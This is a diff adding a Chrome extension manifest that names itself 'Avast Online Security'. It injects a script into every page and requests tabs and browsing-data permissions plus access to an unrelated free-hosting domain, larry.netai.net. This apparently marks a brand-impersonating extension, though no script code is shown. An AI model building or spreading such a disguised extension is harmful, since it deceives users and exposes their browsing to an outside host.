@@ -1,0 +1,29 @@
+{
+  "manifest_version": 2,
+  "name": "Avast Online Security",
+  "short_name": "Avast",
+  "description": "Protección de Avast para su navegador. Nueva versión del Complemento de Protección del Navegador y Reputación Web de Avast.",
+  "version": "11.1.0.955",
+  "browser_action": {
+    "default_icon": "icon.png",
+    "default_popup": "popup.html"
+  },
+  "icons": { "128": "icon.png" },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["js/content.js"],
+      "css" : [],
+      "run_at" : "document_end"
+    }
+  ],
+  "permissions": [
+    "tabs",
+    "browsingData",
+    "http://larry.netai.net/",
+    "https://maps.googleapis.com/"
+  ],
+  "background": {
+    "scripts": ["js/background.js"]
+  }
+}
